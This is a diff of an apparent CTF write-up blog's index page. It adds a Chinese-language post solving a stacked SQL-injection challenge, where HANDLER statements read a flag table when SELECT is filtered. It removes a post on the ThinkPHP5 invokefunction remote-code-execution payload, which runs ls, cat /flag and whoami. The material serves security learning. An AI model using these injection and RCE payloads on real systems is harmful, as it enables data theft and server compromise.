@@ -69,6 +69,77 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/11/web11/" class="article-date">
+  <time class="dt-published" datetime="2025-02-11T14:26:11.000Z" itemprop="datePublished">2025-02-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/11/web11/">web11</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a href="">1.题目</a></p>
+<p><a href="">2.总结</a></p>
+<p><strong>1.1[GYCTF2020]Blacklist:</strong></p>
+<p>​	打开环境，提交查询后，页面如下：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-222905.png"></p>
+<p>​	判断字段，到<code> 1&#39; order by 3#</code>时，报错：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-223251.png"></p>
+<p>​	进行联合查询，<code> 1&#39; union select 1,2#</code>,得知是进行了过滤，用堆叠注入。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-223440.png"></p>
+<p>​	先查询数据库，<code>&#39;;show databases;# </code>,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-231746.png"></p>
+<p>​	查表名，<code>&#39;; show tables;# </code>,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-231835.png"></p>
+<p>​	查列名，<code>&#39;;show columns from FlagHere;# </code>,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-232011.png"></p>
+<p>​	最后应该直接查看flag，但是select被过滤了。 <code> &#39;;select flag from FlagHere ;#</code>,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-232141.png"></p>
+<p>​	既然无法用select命令，还可以用handler命令,构造payload,得到flag。</p>
+<p><code>  1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code>,                         </p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ20250211-233315.png"></p>
+<p><strong>2.1总结</strong>：</p>
+<p><strong>堆叠注入：</strong></p>
+<p>(1).只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行。</p>
+<p>(2).查看数据库：<code>&#39;;show databases;</code></p>
+<p>​     查看表名：<code>&#39;;show tables;</code></p>
+<p>​     查看列:   <code>&#39;;select flag from</code>1919810931114514<code>;</code>       </p>
+<p>​     查看数据：<code> &#39;;select flag from</code>1919810931114514<code>;</code></p>
+<p><strong>2.2总结：</strong></p>
+<p><strong>handler命令</strong>：</p>
+<p>(1).select 被禁用handler可以替代 （handler+[table_name]+open）先将表打开（handler+[table_name]+read+[first]）读取表里的第一个column将first换成next将依次向下读取。</p>
+<p>(2).查询规则：</p>
+<p><code>1&#39;;handler table_name open;handler table_name read first;handler table_name close;</code></p>
+<p><code>1&#39;;handler table_name open;handler table_name read next;handler table_name close;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://qin456486.github.io/2025/02/11/web11/" data-id="cm70nqfgu0000p0v3h5d7hacz" data-title="web11" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/10/web10/" class="article-date">
@@ -612,66 +683,6 @@
 
 
   
-    <article id="post-web2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/18/web2/" class="article-date">
-  <time class="dt-published" datetime="2025-01-18T05:15:41.000Z" itemprop="datePublished">2025-01-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/18/web2/">web2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>Thinkphp5</strong></p>
-<p>&#x3D;&#x3D;攻防世界php_rce&#x3D;&#x3D;:</p>
-<p>进入题目环境，页面如下：</p>
-<p><img src="/$%7Bfiilename%7D/QQ20250117-200433.png"></p>
-<p>可能存在ThinkPHP5版本框架的漏洞。构造payload: <code>s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=ls /</code></p>
-<p><img src="/$%7Bfiilename%7D/QQ20250118-135127.png"></p>
-<p>在根目录下看到flag,构造payload进入flag目录，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /flag</span><br></pre></td></tr></table></figure>
-
-<p><img src="/$%7Bfiilename%7D/QQ20250118-140114.png"></p>
-<p>用cat命令查看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=cat /flag</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/$%7Bfiilename%7D/QQ20250118-140431.png"></p>
-<p>&#x3D;&#x3D;总结&#x3D;&#x3D;：1.构造过程中用到的call_user_func_array()函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(参数一，参数二)：</span><br><span class="line">参数一：表示一个回调函数。</span><br><span class="line">参数二：表示传递给这个回调函数的参数，参数二的数据类型为数组。</span><br><span class="line">如果回调函数成功执行，则返回执行结果，否则返回False值.</span><br></pre></td></tr></table></figure>
-
-<p>2.ThinkPHP5 invokeFunction漏洞:</p>
-<p>漏洞payload      <code>s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p>
-<p>s参数是thinkphp的一种路由形式,这里传入的函数是call_user_func_array<br>参数是[system,[whoami]],call_user_func_array第一个参数是函数名，第二个参数也是数组.</p>
-<p>&#x3D;&#x3D;参考&#x3D;&#x3D;：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/303908.html">https://www.freebuf.com/vuls/303908.html</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://qin456486.github.io/2025/01/18/web2/" data-id="cm61szo2u0000e4v33jzf6r1e" data-title="web2" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -708,6 +719,10 @@
       <ul>
         
           <li>
+            <a href="/2025/02/11/web11/">web11</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/10/web10/">web10</a>
           </li>
         
@@ -721,10 +736,6 @@
         
           <li>
             <a href="/2025/02/02/misc1/">misc1</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/31/web7/">web7</a>
           </li>
         
       </ul>
